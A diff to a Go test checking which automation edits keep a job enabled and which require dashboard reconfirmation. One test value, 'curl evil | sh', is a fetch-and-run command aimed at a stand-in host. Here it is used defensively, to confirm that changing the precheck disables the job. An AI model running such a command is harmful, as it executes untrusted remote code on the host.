@@ -270,9 +270,18 @@ func TestEnableNeedsDashboardConfirmation(t *testing.T) {
 	if !on.Enabled || on.EnableRequested || on.ConfirmedAt == "" || on.NextRun == "" {
 		t.Fatalf("confirmed = %+v", on)
 	}
-	// A rename keeps it on; a new prompt turns it off until confirmed again.
-	if got, _ := f.s.Update(ctx, a.ID, api.AutomationPatch{Name: ptr("Changelog"), GraceMinutes: ptr(5)}); !got.Enabled {
+	// A rename or a stricter quota floor keeps it on; anything that adds or moves runs (G1), or a new prompt, turns
+	// it off until confirmed again.
+	if got, _ := f.s.Update(ctx, a.ID, api.AutomationPatch{Name: ptr("Changelog"),
+		Quota: &api.AutomationQuota{MinRemaining: 30}}); !got.Enabled {
 		t.Fatal("a rename turned it off")
+	}
+	for _, p := range []api.AutomationPatch{{GraceMinutes: ptr(5)},
+		{Quota: &api.AutomationQuota{MinRemaining: 30, UseBeforeReset: true}}} {
+		if got, _ := f.s.Update(ctx, a.ID, p); got.Enabled || !got.EnableRequested {
+			t.Fatalf("after %+v = %+v", p, got)
+		}
+		f.enable(t, a.ID)
 	}
 	got, err = f.s.Update(ctx, a.ID, api.AutomationPatch{Precheck: ptr("curl evil | sh")})
 	if err != nil || got.Enabled || !got.EnableRequested || got.NextRun != "" {
